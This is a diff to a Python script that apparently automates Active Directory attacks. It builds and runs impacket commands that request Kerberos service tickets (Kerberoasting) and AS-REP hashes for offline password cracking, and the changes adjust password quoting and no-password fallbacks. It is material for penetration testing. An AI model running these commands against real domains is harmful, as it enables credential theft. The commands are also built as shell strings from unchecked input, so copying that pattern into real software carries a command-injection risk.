@@ -73,10 +73,10 @@ def print_cracking_cmd():
 
 
 def check_kerberoast(target, domain, user='Guest', passw=''):
-    cmd = f'impacket-GetUserSPNs {domain}/{user}:{passw} -dc-ip {target} -stealth -request -output tickets.txt'
+    cmd = f'impacket-GetUserSPNs {domain}/{user}:"{passw}" -dc-ip {target} -stealth -request -output tickets.txt'
 
-    if (user == 'Guest'):
-        cmd = f'impacket-GetUserSPNs {domain}/jhon.doe -no-pass -dc-ip {target} -stealth -request -output tickets.txt'
+    if (not passw):
+        cmd = f'impacket-GetUserSPNs {domain}/{user} -no-pass -dc-ip {target} -stealth -request -output tickets.txt'
 
     output = None
     output = None
@@ -101,7 +101,7 @@ def check_kerberoast(target, domain, user='Guest', passw=''):
             log(output, cmd, target, 'impacket-GetUserSPNs')
 
 
-            cmd = f'impacket-GetUserSPNs {domain}/{user}:{passw} -dc-ip {target} -stealth -request -output tickets.txt'
+            cmd = f'impacket-GetUserSPNs {domain}/{user}:"{passw}" -dc-ip {target} -stealth -request -output tickets.txt'
             output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
 
             print_separator()
@@ -167,10 +167,10 @@ def check_asreproast(target, domain, user='Guest', passw=''):
     filename = 'smb_users.txt'
     if not (os.path.exists(filename)):
         return
-    if (user == 'Guest'):
-        cmd = f'impacket-GetNPUsers -no-pass {domain}/guest -dc-ip {target} -usersfile {filename} -output tickets.txt'
+    if (not passw):
+        cmd = f'impacket-GetNPUsers -no-pass {domain}/{user} -dc-ip {target} -usersfile {filename} -output tickets.txt'
     # Creds
-    cmd = f'impacket-GetNPUsers {domain}/{user}:{passw} -dc-ip {target} -usersfile {filename} -output tickets.txt'
+    cmd = f'impacket-GetNPUsers {domain}/{user}:"{passw}" -dc-ip {target} -usersfile {filename} -output tickets.txt'
 
     output = None
     try:
